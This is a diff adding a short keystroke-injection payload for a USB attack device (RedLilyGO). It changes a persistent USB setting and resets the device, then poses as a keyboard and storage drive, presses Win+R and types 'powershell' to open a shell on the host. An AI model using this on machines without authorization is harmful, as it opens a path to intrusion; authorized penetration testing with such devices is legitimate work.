@@ -1,0 +1,15 @@
+REM RedLilyGO - HID + Disk Shell. Forces USB off, then exposes the SD and opens a shell. Changes a persistent setting. Authorized testing only.
+DEFINE #SETTING_NAME usbDeviceType
+VAR $SETTING_USB_DEVICE_TYPE_NONE = 0
+IF (GET_SETTING_VALUE() != $SETTING_USB_DEVICE_TYPE_NONE) THEN
+    DISPLAY_CLEAR
+    DISPLAY_TEXT 0 0 Setting mode to None
+    SET_SETTING_UINT16 usbDeviceType $SETTING_USB_DEVICE_TYPE_NONE
+    DELAY 3000
+    RESET
+END_IF
+ATTACKMODE HID STORAGE
+DELAY 5000
+GUI R
+DELAY 1000
+STRINGLN powershell
